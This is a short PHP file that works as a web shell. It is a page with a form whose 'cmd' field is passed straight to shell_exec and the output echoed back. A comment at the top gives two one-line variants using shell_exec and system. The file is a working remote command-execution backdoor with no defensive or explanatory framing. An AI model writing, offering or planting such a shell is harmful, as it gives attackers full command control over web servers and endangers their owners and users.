<?php
	/* basic oneliner: <?php echo shell_exec($_GET['c'].' 2>&1'); ?>
	   tiny oneliner: <?php system($_GET['c']); ?> */
?>

<html>
	<body onLoad="self.focus();document.f.cmd.focus()">
	<form method="GET" name="f" action="">
		<input type="text" name="cmd">
		<input type="submit" value="exec">
	</form>
	<pre>

<?php
if($_GET['cmd'])
	echo shell_exec($_GET['cmd'].' 2>&1');
?>

	</pre>
	</body>
</html>
